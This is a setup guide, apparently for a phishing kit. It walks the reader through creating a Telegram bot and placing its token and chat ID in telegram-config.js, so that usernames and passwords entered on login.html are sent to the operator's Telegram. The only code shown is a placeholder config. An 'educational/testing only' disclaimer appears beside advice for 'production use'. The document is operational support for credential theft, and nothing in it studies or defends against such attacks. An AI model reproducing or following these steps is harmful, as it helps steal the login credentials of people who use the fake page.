# Telegram Integration Setup Guide

## How to Set Up Telegram Bot to Receive Login Credentials

### Step 1: Create a Telegram Bot

1. Open Telegram and search for **@BotFather**
2. Start a conversation with BotFather
3. Send the command: `/newbot`
4. Follow the instructions to name your bot
5. BotFather will give you a **Bot Token** (looks like: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)
6. **Save this token** - you'll need it in Step 3

### Step 2: Get Your Chat ID

1. Search for **@userinfobot** on Telegram
2. Start a conversation with it
3. It will send you your **Chat ID** (a number like: `123456789`)
4. **Save this Chat ID** - you'll need it in Step 3

### Step 3: Configure the Bot

1. Open the file `telegram-config.js` in your project
2. Replace `YOUR_BOT_TOKEN_HERE` with your Bot Token from Step 1
3. Replace `YOUR_CHAT_ID_HERE` with your Chat ID from Step 2

Example:
```javascript
const TELEGRAM_CONFIG = {
    BOT_TOKEN: '123456789:ABCdefGHIjklMNOpqrsTUVwxyz',
    CHAT_ID: '123456789'
};
```

### Step 4: Test It

1. Open `login.html` in your browser
2. Enter any username and password
3. Click "Login"
4. Check your Telegram - you should receive a message with the login credentials!

## Important Notes

⚠️ **Security Warning**: 
- Never share your Bot Token publicly
- Never commit `telegram-config.js` with real credentials to public repositories
- This is for educational/testing purposes only

## Troubleshooting

- **Not receiving messages?** 
  - Double-check your Bot Token and Chat ID
  - Make sure you've started a conversation with your bot first (send `/start` to your bot)
  
- **CORS errors?**
  - The Telegram Bot API should work from browsers, but if you encounter CORS issues, you may need to use a backend proxy

## Alternative: Using a Backend Server

For production use, it's recommended to send credentials to your own backend server, which then forwards them to Telegram. This keeps your Bot Token secure.

